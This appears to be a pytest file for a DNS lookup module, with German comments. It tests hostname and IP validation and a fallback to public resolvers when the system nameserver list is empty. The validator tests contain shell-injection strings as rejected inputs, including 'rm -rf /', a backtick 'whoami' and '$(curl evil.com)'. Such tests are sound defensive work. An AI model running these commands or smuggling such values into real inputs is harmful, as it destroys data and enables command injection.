from app.modules.dns.common import is_valid_hostname, is_valid_ip


def test_accepts_valid_domains():
    assert is_valid_hostname("example.com")
    assert is_valid_hostname("sub.example.co.uk")
    assert is_valid_hostname("{{BASE_DOMAIN}}")


def test_rejects_shell_metacharacters():
    assert not is_valid_hostname("example.com; rm -rf /")
    assert not is_valid_hostname("example.com`whoami`")
    assert not is_valid_hostname("$(curl evil.com)")


def test_rejects_empty_and_malformed():
    assert not is_valid_hostname("")
    assert not is_valid_hostname("-example.com")
    assert not is_valid_hostname("example..com")


def test_ip_validator():
    assert is_valid_ip("8.8.8.8")
    assert is_valid_ip("2001:4860:4860::8888")
    assert not is_valid_ip("not-an-ip")
    assert not is_valid_ip("8.8.8.8; rm -rf /")


# --- query(): Fallback auf oeffentliche Resolver bei kaputter System-Konfiguration ---
#
# Ausgangspunkt: gemeldeter Bug -- dns-lookup schlug fuer JEDEN Record-Typ
# mit "Keine Nameserver erreichbar" fehl, in unter 10ms fuer 5 Record-
# Typen zusammen. Reproduziert: dnspython wirft NoNameservers in <1ms,
# wenn die (aus /etc/resolv.conf geparste) Nameserver-Liste leer ist --
# kein echter Netzwerkversuch findet dann statt. Ursache vermutlich eine
# kurzzeitig kaputte DNS-Kette im Container (z.B. Docker-DNS oder ein
# interner Resolver wie AdGuard Home), nicht die abgefragte Domain
# selbst. query() faengt das jetzt ab und weicht automatisch auf
# oeffentliche Resolver aus, SOLANGE kein expliziter Nameserver
# angefordert wurde.

import asyncio

import dns.asyncresolver
import dns.resolver
import pytest

from app.modules.dns import common


def _patch_empty_nameservers(monkeypatch):
    """Simuliert eine kaputte System-Resolver-Konfiguration: dnspython
    findet beim automatischen Konfigurieren keine Nameserver."""
    original_init = dns.asyncresolver.Resolver.__init__

    def broken_init(self, *args, **kwargs):
        original_init(self, *args, **kwargs)
        self.nameservers = []

    monkeypatch.setattr(dns.asyncresolver.Resolver, "__init__", broken_init)


@pytest.mark.asyncio
async def test_query_falls_back_to_public_resolvers_when_system_config_empty(monkeypatch):
    _patch_empty_nameservers(monkeypatch)

    async def fake_resolve(self, domain, record_type):
        # Nur bei den Fallback-Resolvern (1.1.1.1/8.8.8.8) erfolgreich --
        # bestaetigt, dass tatsaechlich DIESE Server verwendet wurden.
        if self.nameservers == ["1.1.1.1", "8.8.8.8"]:
            class FakeRR:
                ttl = 300

            class FakeAnswer(list):
                rrset = FakeRR()

            answer = FakeAnswer([type("R", (), {"to_text": lambda self: "203.0.113.1"})()])
            return answer
        raise dns.resolver.NoNameservers()

    monkeypatch.setattr(dns.asyncresolver.Resolver, "resolve", fake_resolve)

    result = await common.query("example.com", "A")

    assert result["success"] is True
    assert result["records"] == ["203.0.113.1"]
    assert result["note"] is not None and "oeffentliche DNS-Server" in result["note"]


@pytest.mark.asyncio
async def test_query_does_not_fall_back_for_explicit_nameserver(monkeypatch):
    """Wurde ein Nameserver EXPLIZIT vom Nutzer angefordert, darf query()
    NICHT still auf einen anderen ausweichen -- der Nutzer wollte gezielt
    DIESEN Server testen (z.B. um dessen Antwort zu pruefen)."""

    async def always_fail(self, domain, record_type):
        raise dns.resolver.NoNameservers()

    monkeypatch.setattr(dns.asyncresolver.Resolver, "resolve", always_fail)

    result = await common.query("example.com", "A", nameserver="192.0.2.1")

    assert result["success"] is False
    assert "Keine Nameserver erreichbar" in result["error"]
    assert "note" not in result


@pytest.mark.asyncio
async def test_query_no_note_when_system_resolver_works_normally(monkeypatch):
    """Der haeufigste Fall: System-Resolver funktioniert normal -- kein
    Fallback noetig, kein 'note'-Feld in der Antwort."""

    async def fake_resolve(self, domain, record_type):
        class FakeRR:
            ttl = 300

        class FakeAnswer(list):
            rrset = FakeRR()

        return FakeAnswer([type("R", (), {"to_text": lambda self: "203.0.113.5"})()])

    monkeypatch.setattr(dns.asyncresolver.Resolver, "resolve", fake_resolve)

    result = await common.query("example.com", "A")

    assert result["success"] is True
    assert "note" not in result


@pytest.mark.asyncio
async def test_query_error_message_includes_dnspython_detail_when_fallback_also_fails(monkeypatch):
    """Schlaegt selbst der Fallback fehl, soll die Fehlermeldung
    dnspython's eigene Detail-Information enthalten (welcher Server,
    welcher Fehler) statt nur des generischen statischen Texts -- deutlich
    hilfreicher zur Fehlersuche."""

    async def always_fail(self, domain, record_type):
        raise dns.resolver.NoNameservers()

    monkeypatch.setattr(dns.asyncresolver.Resolver, "resolve", always_fail)

    result = await common.query("example.com", "A")

    assert result["success"] is False
    assert "Keine Nameserver erreichbar" in result["error"]
    # str(exc) wird mit angehaengt -- mehr als nur der statische Praefix
    assert len(result["error"]) > len("Keine Nameserver erreichbar ()")


def test_reproduces_original_bug_report_empty_nameservers_fails_in_under_50ms():
    """Direkte Reproduktion des gemeldeten Symptoms (ohne den Fix): eine
    leere Nameserver-Liste fuehrt zu einem Fehlschlag in unter 50ms, kein
    echter Netzwerkversuch findet statt -- das erklaert, warum ALLE
    Record-Typen gleichzeitig und extrem schnell fehlschlugen, statt
    einzeln und mit spuerbarer Verzoegerung wie bei einem echten
    Netzwerk-Timeout."""
    import time

    async def _run():
        resolver = dns.asyncresolver.Resolver(configure=False)
        resolver.nameservers = []
        start = time.monotonic()
        try:
            await resolver.resolve("google.com", "A")
        except dns.resolver.NoNameservers:
            return time.monotonic() - start
        return None

    elapsed = asyncio.run(_run())
    assert elapsed is not None
    assert elapsed < 0.05, "Sollte nahezu instantan fehlschlagen, kein echter Netzwerkversuch"
